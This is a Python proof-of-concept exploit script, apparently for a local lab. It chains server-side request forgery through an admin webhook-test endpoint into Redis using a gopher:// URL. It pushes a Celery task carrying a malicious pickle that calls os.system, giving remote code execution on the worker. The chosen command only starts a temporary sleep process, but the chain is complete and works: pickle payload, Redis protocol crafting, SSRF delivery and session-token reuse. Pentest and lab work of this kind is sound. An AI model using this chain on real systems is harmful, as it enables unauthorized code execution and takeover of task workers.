#!/usr/bin/env python3

import base64
import json
import os
import pickle
import urllib.parse

import requests


WEBHOOK_URL = "http://localhost:8080/api/admin/webhook-test"

JWT = os.environ["SESSION_TOKEN"]

# ------------------------------------------------------------
# 無害 RCE proof
#
# 建立一個 180 秒後自動結束的背景 process。
# 不建立 listener、不 reverse shell、不做持久化。
# ------------------------------------------------------------

COMMAND = (
    "sh -c "
    "'sleep 180 >/dev/null 2>&1 & "
    "echo $! > /tmp/celery_background_pid'"
)


class RCE:
    def __reduce__(self):
        return (
            __import__("os").system,
            (COMMAND,),
        )


# ------------------------------------------------------------
# Celery message envelope
# ------------------------------------------------------------

TASK = {
    "content-type": "application/x-python-serialize",
    "properties": {
        "delivery_tag": "16f3f59d-003c-4ef4-b1ea-6fa92dee529a",
        "reply_to": "9edb8565-0b59-3389-944e-a0139180a048",
        "delivery_mode": 2,
        "body_encoding": "base64",
        "delivery_info": {
            "routing_key": "celery",
            "priority": 0,
            "exchange": "celery",
        },
        "correlation_id": "6e046b48-bca4-49a0-bfa7-a92847216999",
    },
    "headers": {},
    "content-encoding": "binary",
}


def make_pickle_body():
    payload = pickle.dumps(
        RCE(),
        protocol=2,
    )

    print("[+] Pickle payload:")
    print(f"    {len(payload)} bytes")

    return base64.b64encode(payload).decode()


def make_redis_lpush(task_json):
    data = task_json.encode()

    return (
        b"*3\r\n"
        b"$5\r\nLPUSH\r\n"
        b"$6\r\ncelery\r\n"
        + f"${len(data)}\r\n".encode()
        + data
        + b"\r\n"
    )


def make_gopher_url(resp):
    encoded = urllib.parse.quote_from_bytes(
        resp,
        safe="",
    )

    return "gopher://redis:6379/_" + encoded


def main():
    print("[+] Target:")
    print(f"    {WEBHOOK_URL}")

    print("[+] RCE command:")
    print(f"    {COMMAND}")

    # 1. Pickle
    TASK["body"] = make_pickle_body()

    # 2. Celery envelope → JSON
    task_json = json.dumps(
        TASK,
        separators=(",", ":"),
    )

    print("[+] Celery message:")
    print(f"    {len(task_json)} bytes")

    # 3. Redis LPUSH
    resp = make_redis_lpush(task_json)

    print("[+] Redis RESP:")
    print(f"    {len(resp)} bytes")

    # 4. Gopher
    gopher_url = make_gopher_url(resp)

    print("[+] Gopher URL:")
    print(gopher_url)

    # 5. SSRF → Redis
    headers = {
        "Content-Type": "application/json",
        "Cookie": f"session_token={JWT}",
    }

    print("\n[+] Sending payload...")

    response = requests.post(
        WEBHOOK_URL,
        headers=headers,
        json={
            "url": gopher_url,
        },
        timeout=10,
    )

    print(f"[+] HTTP status: {response.status_code}")
    print("[+] Response:")
    print(response.text)

    print("\n[+] Payload sent.")
    print("[+] Check the worker container:")
    print()
    print(
        'docker compose exec celery-worker '
        'cat /tmp/celery_background_pid'
    )
    print()
    print(
        'docker compose exec celery-worker '
        'sh -c \'ps -p $(cat /tmp/celery_background_pid) -o pid,ppid,user,cmd\''
    )
    print()
    print("[+] The process should disappear after ~180 seconds.")


if __name__ == "__main__":
    main()